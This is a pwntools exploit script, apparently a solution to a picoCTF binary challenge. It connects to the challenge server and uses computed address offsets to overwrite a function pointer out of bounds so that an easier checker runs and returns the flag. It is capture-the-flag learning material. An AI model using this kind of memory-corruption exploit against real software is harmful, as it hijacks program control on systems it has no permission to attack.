#! /usr/bin/env python

from pwn import *

context(arch='i386', os='linux')

# nc saturn.picoctf.net 61499
p = remote(host='saturn.picoctf.net', port=61499)

# payload
# variables
check_addr = 0x0804c040
fun_addr = 0x0804c080
var_offset = int((check_addr-fun_addr)/4)

# function 
hard_checker_addr = 0x8049436
easy_checker_addr = 0x80492fc
easy_checker__nocmp_addr = 0x0804932b
fun_offset = easy_checker_addr - hard_checker_addr

success("var offset = %s \nfun offset = %s", var_offset, fun_offset)


# method 1 
p.sendlineafter(b'>>', b'abcdefghijklk')    # b'abcdefghijklk' = 1337
p.sendlineafter(b'10.', str(var_offset))
p.sendline(str(fun_offset))
log.info(p.recvall())

"""
# method 2
p.sendlineafter(b'>>', b'GiveMeFlag')    # b'abcdefghijklk' = 1337
p.sendlineafter(b'10.', str(var_offset))

fun_offset =  easy_checker__nocmp_addr - hard_checker_addr

p.sendline(str(fun_offset))
log.info(p.recvall())
"""


